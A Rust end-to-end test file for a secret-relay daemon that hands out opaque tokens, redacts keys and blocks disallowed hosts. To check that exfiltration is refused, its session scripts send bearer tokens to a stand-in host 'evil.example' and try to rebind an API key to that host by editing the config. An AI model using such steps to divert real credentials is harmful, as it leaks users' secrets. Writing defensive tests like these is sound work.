//! M6 HTTP delegation e2e: real `smith`, `locksmithd` and `curl`, with a plain-HTTP echo server
//! standing in for the API hosts (`LOCKSMITH_TEST_HTTP_UPSTREAM`). The echo server reflects the
//! Authorization header, so any credential that reached it comes back unless the relay masks it.
//! Fake secrets are built at runtime.

mod common;
use common::*;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
use std::sync::{Arc, Mutex, Once};
use std::time::{Duration, Instant};

const HOST: &str = "api.relay.test";

fn s(b: &[u8]) -> String {
    String::from_utf8_lossy(b).into_owned()
}

fn have_curl() -> bool {
    Command::new("curl")
        .arg("--version")
        .output()
        .is_ok_and(|o| o.status.success())
}

macro_rules! need_curl {
    () => {
        if !have_curl() {
            eprintln!("SKIP: curl is not installed");
            return;
        }
    };
}

fn bin_dir() -> PathBuf {
    Path::new(env!("CARGO_BIN_EXE_smith"))
        .parent()
        .unwrap()
        .to_path_buf()
}

fn locksmithd() -> PathBuf {
    static BUILD: Once = Once::new();
    let p = bin_dir().join("locksmithd");
    BUILD.call_once(|| {
        if !p.exists() {
            let cargo = std::env::var("CARGO").unwrap_or("cargo".into());
            assert!(
                Command::new(cargo)
                    .args(["build", "-p", "locksmithd"])
                    .status()
                    .unwrap()
                    .success()
            );
        }
    });
    p
}

fn wait_for(p: &Path) {
    let t = Instant::now();
    while !p.exists() {
        assert!(
            t.elapsed() < Duration::from_secs(30),
            "timed out: {}",
            p.display()
        );
        std::thread::sleep(Duration::from_millis(50));
    }
}

#[derive(Default)]
struct Seen {
    requests: AtomicUsize,
    auth: Mutex<Vec<String>>,
}

/// Echo upstream: `auth=<Authorization> path=<path>`.
fn start_upstream(seen: Arc<Seen>) -> SocketAddr {
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = l.local_addr().unwrap();
    std::thread::spawn(move || {
        for mut st in l.incoming().flatten() {
            let seen = seen.clone();
            std::thread::spawn(move || {
                let mut buf = Vec::new();
                let mut tmp = [0u8; 4096];
                while !buf.windows(4).any(|w| w == b"\r\n\r\n") {
                    let n = st.read(&mut tmp).unwrap_or(0);
                    if n == 0 {
                        return;
                    }
                    buf.extend_from_slice(&tmp[..n]);
                }
                let head = s(&buf);
                let path = head.split(' ').nth(1).unwrap_or("").to_string();
                let auth = head
                    .lines()
                    .find_map(|l| {
                        let (k, v) = l.split_once(':')?;
                        k.eq_ignore_ascii_case("authorization")
                            .then(|| v.trim().to_string())
                    })
                    .unwrap_or_default();
                seen.requests.fetch_add(1, SeqCst);
                seen.auth.lock().unwrap().push(auth.clone());
                let body = format!("auth={auth} path={path}\n");
                let _ = write!(
                    st,
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
            });
        }
    });
    addr
}

struct Env {
    h: Home,
    run: PathBuf,
    work: PathBuf,
    daemon: Option<std::process::Child>,
    secret: String,
    seen: Arc<Seen>,
}

const PROXIES: [&str; 8] = [
    "HTTPS_PROXY",
    "https_proxy",
    "HTTP_PROXY",
    "http_proxy",
    "ALL_PROXY",
    "NO_PROXY",
    "no_proxy",
    "CURL_CA_BUNDLE",
];

impl Env {
    /// `key`: vault key holding the fake secret; `hosts`: names routed to the echo upstream.
    fn new(key: &str, hosts: &[&str], binding: &str) -> Env {
        locksmithd();
        let h = Home::new();
        let id =
            h.0.file_name()
                .unwrap()
                .to_string_lossy()
                .replace("smith-e2e-", "");
        let run = PathBuf::from(format!("/tmp/lsh-{id}"));
        let work = h.0.join("work");
        std::fs::create_dir_all(&work).unwrap();
        std::fs::write(work.join(".locksmith.toml"), binding).unwrap();
        let secret = format!("sk_test_{}_{}", std::process::id(), id);
        let seen = Arc::new(Seen::default());
        h.ready();
        assert!(h.add(key, &secret).status.success());
        let addr = start_upstream(seen.clone());
        let up: Vec<String> = hosts.iter().map(|h| format!("{h}={addr}")).collect();
        let mut d = Command::new(locksmithd());
        d.env("LOCKSMITH_HOME", &h.0)
            .env("LOCKSMITH_RUNTIME_DIR", &run)
            .env("LOCKSMITH_INSECURE_TEST_KDF", "1")
            .env("LOCKSMITH_TEST_HTTP_UPSTREAM", up.join(","))
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null());
        for p in PROXIES {
            d.env_remove(p);
        }
        let daemon = Some(d.spawn().unwrap());
        wait_for(&run.join("locksmithd.sock"));
        Env {
            h,
            run,
            work,
            daemon,
            secret,
            seen,
        }
    }

    fn smith(&self, args: &[&str]) -> Command {
        let mut c = self.h.cmd(&[]);
        c.args(args)
            .current_dir(&self.work)
            .env("LOCKSMITH_RUNTIME_DIR", &self.run)
            .env(
                "PATH",
                format!("{}:{}", bin_dir().display(), std::env::var("PATH").unwrap()),
            );
        for p in PROXIES {
            c.env_remove(p);
        }
        c
    }

    fn out(&self, args: &[&str]) -> Output {
        let mut c = self.smith(args);
        c.stdin(Stdio::null());
        c.output().unwrap()
    }

    /// `smith --passphrase-stdin <args>`.
    fn with_pw(&self, args: &[&str]) -> Output {
        let mut full = vec!["--passphrase-stdin"];
        full.extend_from_slice(args);
        let mut c = self.smith(&full).spawn().unwrap();
        c.stdin
            .take()
            .unwrap()
            .write_all(format!("{PW}\n").as_bytes())
            .unwrap();
        c.wait_with_output().unwrap()
    }

    fn session(&self, script: &str) -> std::process::Child {
        let mut c = self
            .smith(&[
                "--passphrase-stdin",
                "session",
                "start",
                "--",
                "sh",
                "-c",
                script,
            ])
            .spawn()
            .unwrap();
        c.stdin
            .take()
            .unwrap()
            .write_all(format!("{PW}\n").as_bytes())
            .unwrap();
        c
    }

    fn port(&self) -> u16 {
        let o = self.out(&["--json", "http", "status"]);
        let v: serde_json::Value = serde_json::from_slice(&o.stdout)
            .unwrap_or_else(|_| panic!("{} {}", s(&o.stdout), s(&o.stderr)));
        v["port"].as_u64().unwrap() as u16
    }

    fn audit(&self) -> Vec<serde_json::Value> {
        let o = self.out(&["audit", "ls", "--json", "--limit", "200"]);
        let v: serde_json::Value = serde_json::from_slice(&o.stdout).unwrap();
        v["events"].as_array().unwrap().clone()
    }

    fn gate(&self, name: &str) -> String {
        format!(
            "touch {w}/{name}.ready; while [ ! -e {w}/{name}.go ]; do sleep 0.1; done",
            w = self.work.display()
        )
    }
}

impl Drop for Env {
    fn drop(&mut self) {
        if let Some(d) = &mut self.daemon {
            let _ = d.kill();
            let _ = d.wait();
        }
        let _ = std::fs::remove_dir_all(&self.run);
    }
}

fn has(ev: &[serde_json::Value], action: &str, needle: &str) -> bool {
    ev.iter().any(|e| {
        e["action"] == action
            && (e["target"].as_str().unwrap_or("").contains(needle)
                || e["policy_rule"].as_str().unwrap_or("").contains(needle))
    })
}

#[test]
fn token_relay_allowlist_placement_and_revoke() {
    need_curl!();
    let e = Env::new(
        "API_KEY",
        &[HOST, "evil.example"],
        &format!("[http.keys]\nAPI_KEY = {{ hosts = [\"{HOST}\"], placement = \"bearer\" }}\n"),
    );
    let port = e.port();
    let base = format!("http://127.0.0.1:{port}/h");
    let script = format!(
        r#"set -u
T=$(smith token issue API_KEY) || echo ISSUE_FAILED
echo "$T" > tok.txt
smith --json token ls > ls.json
curl -sS -H "Authorization: Bearer $T" {base}/{HOST}/v1/echo
curl -sS -o /dev/null -w "evil=%{{http_code}}\n" -H "Authorization: Bearer $T" {base}/evil.example/x
curl -sS -o /dev/null -w "place=%{{http_code}}\n" "{base}/{HOST}/x?key=$T"
{gate}
curl -sS -o /dev/null -w "after=%{{http_code}}\n" -H "Authorization: Bearer $T" {base}/{HOST}/v1/echo
"#,
        gate = e.gate("r")
    );
    let agent = e.session(&script);
    wait_for(&e.work.join("r.ready"));
    let token = std::fs::read_to_string(e.work.join("tok.txt"))
        .unwrap()
        .trim()
        .to_string();
    assert!(token.starts_with("lsk_") && token.len() == 47, "{token:?}");

    // `smith token ls --json`: names, hosts, a short prefix; never the value or the token.
    let ls = std::fs::read_to_string(e.work.join("ls.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&ls).unwrap();
    let t = &v["tokens"][0];
    assert_eq!(t["key"], "API_KEY");
    assert_eq!(t["hosts"][0], HOST);
    assert_eq!(t["placement"], "bearer");
    assert!(token.starts_with(t["prefix"].as_str().unwrap()));
    assert!(!ls.contains(&e.secret) && !ls.contains(&token), "{ls}");
    let o = e.out(&["--json", "token", "ls"]);
    assert!(s(&o.stdout).contains("API_KEY") && !s(&o.stdout).contains(&e.secret));

    // Replay from outside the session tree: refused, upstream untouched.
    let before = e.seen.requests.load(SeqCst);
    let mut c = TcpStream::connect(("127.0.0.1", port)).unwrap();
    write!(
        c,
        "GET /h/{HOST}/v1/echo HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer {token}\r\n\r\n"
    )
    .unwrap();
    let mut resp = String::new();
    let _ = c.read_to_string(&mut resp);
    assert!(resp.starts_with("HTTP/1.1 403"), "{resp}");
    assert_eq!(e.seen.requests.load(SeqCst), before);

    // Revoking the session kills its tokens at once.
    assert!(e.out(&["revoke", "--all"]).status.success());
    std::fs::write(e.work.join("r.go"), "").unwrap();
    let o = agent.wait_with_output().unwrap();
    let out = s(&o.stdout);
    assert!(!out.contains("ISSUE_FAILED"), "{out} {}", s(&o.stderr));
    assert!(
        out.contains("auth=Bearer [REDACTED:API_KEY] path=/v1/echo"),
        "{out}"
    );
    assert!(
        out.contains("evil=403") && out.contains("place=403"),
        "{out}"
    );
    assert!(
        !out.contains("after=200"),
        "relay worked after revoke: {out}"
    );
    assert!(!out.contains(&e.secret) && !s(&o.stderr).contains(&e.secret));
    // Only the one allowed request reached the upstream, with the real key.
    assert_eq!(e.seen.requests.load(SeqCst), 1);
    assert_eq!(
        e.seen.auth.lock().unwrap()[0],
        format!("Bearer {}", e.secret)
    );

    let ev = e.audit();
    assert!(has(&ev, "TOKEN_ISSUE", "API_KEY"), "{ev:?}");
    assert!(has(&ev, "ACCESS", &format!("http:{HOST}")), "{ev:?}");
    assert!(
        has(&ev, "BLOCKED", "http_host_not_allowed:evil.example"),
        "{ev:?}"
    );
    assert!(has(&ev, "BLOCKED", "http_wrong_placement"), "{ev:?}");
    let all = s(&e.out(&["audit", "ls", "--json", "--limit", "200"]).stdout);
    assert!(!all.contains(&e.secret) && !all.contains(&token));
    let o = e.out(&["--json", "token", "ls"]);
    assert!(
        !s(&o.stdout).contains("API_KEY"),
        "token outlived its lease"
    );
}

#[test]
fn token_revoke_by_prefix_and_issue_errors() {
    need_curl!();
    let e = Env::new(
        "API_KEY",
        &[HOST],
        &format!("[http.keys]\nAPI_KEY = {{ hosts = [\"{HOST}\"] }}\n"),
    );
    assert!(e.h.add("OTHER_KEY", "unbound").status.success());
    let port = e.port();
    let script = format!(
        r#"smith token issue NOPE --host api.stripe.com 2>nope.err; echo "nope=$?"
smith token issue OTHER_KEY 2>nohost.err; echo "nohost=$?"
T=$(smith token issue API_KEY --host {HOST} --placement header:X-Api-Key)
echo "$T" > tok.txt
{gate}
curl -sS -o /dev/null -w "after=%{{http_code}}\n" -H "X-Api-Key: $T" http://127.0.0.1:{port}/h/{HOST}/x
"#,
        gate = e.gate("p")
    );
    let agent = e.session(&script);
    wait_for(&e.work.join("p.ready"));
    let token = std::fs::read_to_string(e.work.join("tok.txt")).unwrap();
    let o = e.out(&["token", "revoke", &token[..12]]);
    assert!(o.status.success(), "{}", s(&o.stderr));
    assert!(s(&o.stdout).contains("revoked 1"));
    assert!(!e.out(&["token", "revoke", "lsk_"]).status.success());
    std::fs::write(e.work.join("p.go"), "").unwrap();
    let out = s(&agent.wait_with_output().unwrap().stdout);
    assert!(out.contains("nope=5") || out.contains("nope=1"), "{out}");
    assert!(
        !out.contains("nope=0") && !out.contains("nohost=0"),
        "{out}"
    );
    assert!(out.contains("after=401"), "{out}");
    assert_eq!(e.seen.requests.load(SeqCst), 0);
    // Outside a session: no lease, no token.
    let o = e.out(&["token", "issue", "API_KEY", "--host", HOST]);
    assert_eq!(o.status.code(), Some(4), "{}", s(&o.stderr));
}

/// Regression (gate A3b): inside a session the agent cannot route the key to a host of its
/// choosing, neither with `--host` nor by editing `.locksmith.toml` after the session started.
#[test]
fn token_hosts_come_from_the_binding_pinned_at_session_start() {
    need_curl!();
    let e = Env::new(
        "API_KEY",
        &[HOST, "evil.example"],
        &format!("[http.keys]\nAPI_KEY = {{ hosts = [\"{HOST}\"] }}\n"),
    );
    let port = e.port();
    let script = format!(
        r#"smith token issue API_KEY --host evil.example 2>host.err; echo "host=$?"
smith token issue API_KEY --host '*.example' 2>/dev/null; echo "wild=$?"
T=$(smith token issue API_KEY --host api.stripe.com) && echo "catalog=0"
cp .locksmith.toml orig.toml
printf '[http.keys]\nAPI_KEY = {{ hosts = ["{HOST}", "evil.example"] }}\n' > .locksmith.toml
smith token issue API_KEY 2>edited.err; echo "edited=$?"
cp orig.toml .locksmith.toml
T=$(smith token issue API_KEY) && echo "pinned=0"
curl -sS -o /dev/null -w "evil=%{{http_code}}\n" -H "Authorization: Bearer $T" http://127.0.0.1:{port}/h/evil.example/x
"#
    );
    let o = e.session(&script).wait_with_output().unwrap();
    let out = s(&o.stdout);
    for want in ["host=3", "catalog=0", "edited=3", "pinned=0", "evil=403"] {
        assert!(out.contains(want), "{want}: {out} {}", s(&o.stderr));
    }
    assert!(!out.contains("wild=0"), "{out}");
    assert!(
        std::fs::read_to_string(e.work.join("host.err"))
            .unwrap()
            .contains("not an approved host for API_KEY"),
    );
    assert!(
        std::fs::read_to_string(e.work.join("edited.err"))
            .unwrap()
            .contains("differs from the copy this session started with"),
    );
    assert_eq!(e.seen.requests.load(SeqCst), 0, "an upstream was contacted");
    let ev = e.audit();
    assert!(
        has(&ev, "BLOCKED", "http_host_not_bound:evil.example"),
        "{ev:?}"
    );
    assert!(has(&ev, "BLOCKED", "binding_changed"), "{ev:?}");
}

#[test]
fn smith_run_gets_opaque_token_and_base_url() {
    need_curl!();
    let e = Env::new(
        "OPENAI_API_KEY",
        &["api.openai.com"],
        "[http.keys]\nOPENAI_API_KEY = \"openai\"\n",
    );
    let port = e.port();
    let o = e.with_pw(&[
        "run",
        "--",
        "sh",
        "-c",
        r#"echo "K=$OPENAI_API_KEY"; echo "B=$OPENAI_BASE_URL"; case "$OPENAI_API_KEY" in lsk_*) echo OPAQUE;; esac
curl -sS -H "Authorization: Bearer $OPENAI_API_KEY" "$OPENAI_BASE_URL/models""#,
    ]);
    let out = s(&o.stdout);
    assert!(o.status.success(), "{out} {}", s(&o.stderr));
    assert!(out.contains("OPAQUE"), "{out}");
    assert!(out.contains("K=[REDACTED:OPENAI_API_KEY(opaque)]"), "{out}");
    assert!(
        out.contains(&format!("B=http://127.0.0.1:{port}/h/api.openai.com/v1")),
        "{out}"
    );
    assert!(
        out.contains("auth=Bearer [REDACTED:OPENAI_API_KEY] path=/v1/models"),
        "{out}"
    );
    assert!(!out.contains(&e.secret) && !out.contains("lsk_"), "{out}");
    assert_eq!(
        e.seen.auth.lock().unwrap().as_slice(),
        [format!("Bearer {}", e.secret)]
    );
    // The lease `smith run` started for the relay ended with the child.
    let o = e.out(&["--json", "status"]);
    let v: serde_json::Value = serde_json::from_slice(&o.stdout).unwrap();
    assert_eq!(v["sessions"].as_array().map(Vec::len), Some(0), "{v}");
}

#[test]
fn explicit_proxy_ca_install_use_and_uninstall() {
    need_curl!();
    let e = Env::new(
        "API_KEY",
        &[HOST],
        &format!("[http.keys]\nAPI_KEY = {{ hosts = [\"{HOST}\"] }}\n"),
    );
    let o = e.with_pw(&["--json", "http", "ca", "install", "--no-trust-store"]);
    assert!(o.status.success(), "{} {}", s(&o.stdout), s(&o.stderr));
    let ca = e.h.0.join("http/ca.pem");
    let pem = std::fs::read_to_string(&ca).unwrap();
    assert!(pem.contains("BEGIN CERTIFICATE") && !pem.contains("PRIVATE"));
    for f in std::fs::read_dir(e.h.0.join("http")).unwrap().flatten() {
        let body = std::fs::read_to_string(f.path()).unwrap_or_default();
        assert!(!body.contains("PRIVATE KEY"), "{}", f.path().display());
    }
    let o = e.out(&["--json", "http", "ca", "status"]);
    let v: serde_json::Value = serde_json::from_slice(&o.stdout).unwrap();
    assert_eq!(v["name_constrained"], true, "{v}");
    assert_eq!(v["permitted_dns"][0], HOST);
    let o = e.out(&["--json", "doctor"]);
    let d = s(&o.stdout);
    let v: serde_json::Value = serde_json::from_str(&d).unwrap();
    let check = |id: &str| {
        v["checks"]
            .as_array()
            .unwrap()
            .iter()
            .find(|c| c["id"] == id)
            .cloned()
            .unwrap_or_else(|| panic!("{id} missing in {d}"))
    };
    assert_eq!(check("http.relay")["status"], "ok", "{d}");
    assert_eq!(check("http.ca_constraints")["status"], "ok", "{d}");

    let port = e.port();
    let script = format!(
        r#"T=$(smith token issue API_KEY)
curl -sS --cacert {ca} -x http://127.0.0.1:{port} -H "Authorization: Bearer $T" https://{HOST}/v1/echo; echo "ok=$?"
curl -sS --cacert {ca} -x http://127.0.0.1:{port} -H "Authorization: Bearer $T" https://example.org/ 2>/dev/null; echo "other=$?"
"#,
        ca = ca.display()
    );
    let o = e.session(&script).wait_with_output().unwrap();
    let out = s(&o.stdout);
    assert!(
        out.contains("auth=Bearer [REDACTED:API_KEY] path=/v1/echo"),
        "{out} {}",
        s(&o.stderr)
    );
    assert!(out.contains("ok=0"), "{out}");
    assert!(!out.contains("other=0"), "{out}");
    assert!(!out.contains(&e.secret));
    assert_eq!(e.seen.requests.load(SeqCst), 1);
    assert!(has(&e.audit(), "BLOCKED", "http_connect_not_enabled"));

    let o = e.with_pw(&["http", "ca", "uninstall", "--no-trust-store"]);
    assert!(o.status.success(), "{}", s(&o.stderr));
    assert!(!ca.exists());
    let o = e.out(&["--json", "http", "ca", "status"]);
    assert!(s(&o.stdout).contains("\"installed\":false"));
}

// ---------------------------------------------------------------- doctor snapshots (task 3.1)

/// The M6 checks (`http.*`, `db.relay*`) of one `smith --json doctor` document, with ports and
/// OS error numbers normalized, pretty-printed. Every id in the document must match the id
/// pattern of `docs/schemas/doctor.v1.json` (dynamic `db.relay.<name>` ids included).
fn m6_checks(doc: &str, ports: &[u16]) -> String {
    let v: serde_json::Value = serde_json::from_str(doc).unwrap_or_else(|_| panic!("{doc}"));
    let schema: serde_json::Value =
        serde_json::from_str(include_str!("../../../docs/schemas/doctor.v1.json")).unwrap();
    let item = &schema["properties"]["checks"]["items"];
    let id_re = regex::Regex::new(item["properties"]["id"]["pattern"].as_str().unwrap()).unwrap();
    let mut out = Vec::new();
    for c in v["checks"].as_array().unwrap() {
        let id = c["id"].as_str().unwrap();
        assert!(id_re.is_match(id), "id {id:?} does not fit the schema");
        for k in item["required"].as_array().unwrap() {
            assert!(c.get(k.as_str().unwrap()).is_some(), "{id} lacks {k}");
        }
        if id.starts_with("http.") || id == "db.relay" || id.starts_with("db.relay.") {
            out.push(c.clone());
        }
    }
    let mut text = serde_json::to_string_pretty(&out).unwrap();
    for p in ports {
        text = text.replace(&format!(":{p}"), ":<port>");
    }
    regex::Regex::new(r"os error \d+")
        .unwrap()
        .replace_all(&text, "os error <n>")
        .into_owned()
        + "\n"
}

/// Compare with `tests/fixtures/doctor_m6/<name>.json`; `UPDATE_GOLDEN=1` rewrites it.
fn snapshot(name: &str, got: &str) {
    let p = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures/doctor_m6")
        .join(format!("{name}.json"));
    if std::env::var_os("UPDATE_GOLDEN").is_some() {
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(&p, got).unwrap();
    }
    let want = std::fs::read_to_string(&p)
        .unwrap_or_else(|_| panic!("{} missing; run with UPDATE_GOLDEN=1", p.display()));
    assert_eq!(
        got, want,
        "{name} snapshot drifted; run with UPDATE_GOLDEN=1"
    );
}

#[test]
fn doctor_m6_snapshots() {
    // 1. No daemon, no binding, no CA: every M6 check skips.
    let h = Home::new();
    let run = h.0.join("no-daemon");
    let o = h
        .cmd(&["--json", "doctor"])
        .env("LOCKSMITH_RUNTIME_DIR", &run)
        .env("LOCKSMITH_UPDATE_URL", "http://127.0.0.1:9")
        .current_dir(&h.0)
        .stdin(Stdio::null())
        .output()
        .unwrap();
    snapshot("offline", &m6_checks(&s(&o.stdout), &[]));
    drop(h);

    // 2. Daemon up (vault locked), no CA, five [db.*] targets in every state the check knows.
    let up = TcpListener::bind("127.0.0.1:0").unwrap();
    let up_port = up.local_addr().unwrap().port();
    let down_port = {
        let l = TcpListener::bind("127.0.0.1:0").unwrap();
        l.local_addr().unwrap().port()
    };
    let binding = format!(
        r#"[http.keys]
API_KEY = {{ hosts = ["{HOST}"] }}
[db.main]
kind = "postgres"
host = "127.0.0.1"
port = {up_port}
user = "app"
password_key = "API_KEY"
[db.prod-ro]
kind = "mysql"
host = "127.0.0.1"
port = {down_port}
user = "ro"
password_key = "MISSING_KEY"
[db.cache]
kind = "redis"
host = "127.0.0.1"
port = {up_port}
[db."Legacy DB"]
kind = "mongo"
host = "h"
"#
    );
    let e = Env::new("API_KEY", &[HOST], &binding);
    let port = e.port();
    let ports = [port, up_port, down_port];
    let mut doctor = e.smith(&["--json", "doctor"]);
    doctor
        .env("LOCKSMITH_UPDATE_URL", "http://127.0.0.1:9")
        .stdin(Stdio::null());
    let o = doctor.output().unwrap();
    snapshot("daemon_locked", &m6_checks(&s(&o.stdout), &ports));

    // 3. Local CA installed, doctor run inside a session (vault unlocked: key names checked).
    let o = e.with_pw(&["http", "ca", "install", "--no-trust-store"]);
    assert!(o.status.success(), "{}", s(&o.stderr));
    let o = e
        .session("LOCKSMITH_UPDATE_URL=http://127.0.0.1:9 smith --json doctor > doctor.json")
        .wait_with_output()
        .unwrap();
    assert!(
        o.status.success() || o.status.code() == Some(1),
        "{}",
        s(&o.stderr)
    );
    let doc = std::fs::read_to_string(e.work.join("doctor.json")).unwrap();
    assert!(!doc.contains(&e.secret));
    snapshot("session_ca", &m6_checks(&doc, &ports));
    drop(up);
}

/// Live smoke (manual workflow `http-live-smoke`, task 1.4): Stripe test mode and OpenAI through
/// the real relay over TLS, keys from `LIVE_STRIPE_TEST_KEY` / `LIVE_OPENAI_API_KEY`.
#[test]
#[ignore = "needs live API keys; run by .github/workflows/http-live-smoke.yml"]
fn live_stripe_and_openai_through_the_relay() {
    need_curl!();
    let (Ok(stripe), Ok(openai)) = (
        std::env::var("LIVE_STRIPE_TEST_KEY"),
        std::env::var("LIVE_OPENAI_API_KEY"),
    ) else {
        panic!("set LIVE_STRIPE_TEST_KEY and LIVE_OPENAI_API_KEY");
    };
    assert!(stripe.starts_with("sk_test_"), "use a Stripe test-mode key");
    let e = Env::new(
        "UNUSED",
        &[],
        "[http.keys]\nSTRIPE_KEY = \"stripe\"\nOPENAI_API_KEY = \"openai\"\n",
    );
    assert!(e.h.add("STRIPE_KEY", &stripe).status.success());
    assert!(e.h.add("OPENAI_API_KEY", &openai).status.success());
    let o = e.with_pw(&[
        "run",
        "--",
        "sh",
        "-c",
        r#"curl -sS -w '\nstripe=%{http_code}\n' -H "Authorization: Bearer $STRIPE_KEY" "$STRIPE_API_BASE/v1/balance"
curl -sS -o models.json -w 'openai=%{http_code}\n' -H "Authorization: Bearer $OPENAI_API_KEY" "$OPENAI_BASE_URL/models"
grep -c '"object": *"model"' models.json"#,
    ]);
    let (out, err) = (s(&o.stdout), s(&o.stderr));
    for k in [&stripe, &openai] {
        assert!(
            !out.contains(k.as_str()) && !err.contains(k.as_str()),
            "a key leaked"
        );
    }
    assert!(out.contains("stripe=200"), "{out} {err}");
    assert!(out.contains("\"object\": \"balance\""), "{out}");
    assert!(out.contains("openai=200"), "{out} {err}");
}
